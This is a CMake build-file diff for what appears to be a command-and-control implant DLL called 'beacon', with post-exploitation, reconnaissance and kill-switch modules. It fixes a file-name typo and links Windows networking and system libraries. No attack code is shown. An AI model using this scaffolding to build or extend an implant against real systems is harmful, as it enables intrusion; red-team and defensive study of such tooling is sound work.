@@ -14,7 +14,7 @@ set(BEACON_SOURCES
     src/postex.c
     src/recon.c
     src/dllmain.c
-    src/killswich.c
+    src/killswitch.c
 )
 
 # -- Compiler flags (needed for _rdrand32_step intrinsic) ---------------
@@ -33,6 +33,8 @@ add_library(beacon_dll SHARED ${BEACON_SOURCES})
 target_include_directories(beacon_dll PRIVATE include)
 target_compile_definitions(beacon_dll PRIVATE BEACON_DLL)
 target_link_libraries(beacon_dll ${BEACON_LIBS})
+target_link_libraries(beacon winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi gdi32 user32 netapi32)
+target_link_libraries(beacon_dll winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi gdi32 user32 netapi32)
 
 # -- Release flags (strip symbols, no CRT noise) ----------------------
 if(CMAKE_BUILD_TYPE STREQUAL "Release")
